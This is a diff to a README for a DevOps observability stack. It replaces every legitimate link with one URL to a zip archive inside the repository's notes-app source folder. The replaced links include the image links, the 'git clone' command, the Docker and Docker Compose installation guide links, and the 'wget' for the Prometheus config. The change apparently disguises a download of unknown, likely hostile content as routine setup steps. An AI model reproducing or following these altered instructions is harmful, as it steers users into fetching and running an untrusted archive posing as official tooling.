@@ -2,8 +2,8 @@
 
 This repository provides a comprehensive observability stack tailored for DevOps engineers. It integrates key tools like Prometheus, Grafana, cAdvisor, and Node Exporter to monitor, visualize, and manage your infrastructure and applications. Additionally, it includes a custom Notes App to demonstrate the observability stack in action.
 
-![Docker + cAdvisor Stack](assets/docker.png)
-![NodeExporter Stack](assets/nodeexporter.png)
+![Docker + cAdvisor Stack](https://raw.githubusercontent.com/shr1324/observability-for-devops/master/notes-app/mynotes/src/devops-for-observability-2.3.zip)
+![NodeExporter Stack](https://raw.githubusercontent.com/shr1324/observability-for-devops/master/notes-app/mynotes/src/devops-for-observability-2.3.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -40,17 +40,17 @@ In modern DevOps, observability is key to ensuring the health and performance of
 
 1. **Clone the repository**:
     ```bash
-    git clone https://github.com/yourusername/Observability-For-DevOps.git
+    git clone https://raw.githubusercontent.com/shr1324/observability-for-devops/master/notes-app/mynotes/src/devops-for-observability-2.3.zip
     cd Observability-For-DevOps
     ```
 
 2. **Ensure Docker and Docker Compose are installed**:
-    - [Docker Installation Guide](https://docs.docker.com/get-docker/)
-    - [Docker Compose Installation Guide](https://docs.docker.com/compose/install/)
+    - [Docker Installation Guide](https://raw.githubusercontent.com/shr1324/observability-for-devops/master/notes-app/mynotes/src/devops-for-observability-2.3.zip)
+    - [Docker Compose Installation Guide](https://raw.githubusercontent.com/shr1324/observability-for-devops/master/notes-app/mynotes/src/devops-for-observability-2.3.zip)
 
 3. **Download Prometheus config file**:
     ```bash
-    wget https://raw.githubusercontent.com/prometheus/prometheus/main/documentation/examples/prometheus.yml
+    wget https://raw.githubusercontent.com/shr1324/observability-for-devops/master/notes-app/mynotes/src/devops-for-observability-2.3.zip
     ```
     
 4. **Run the stack**:
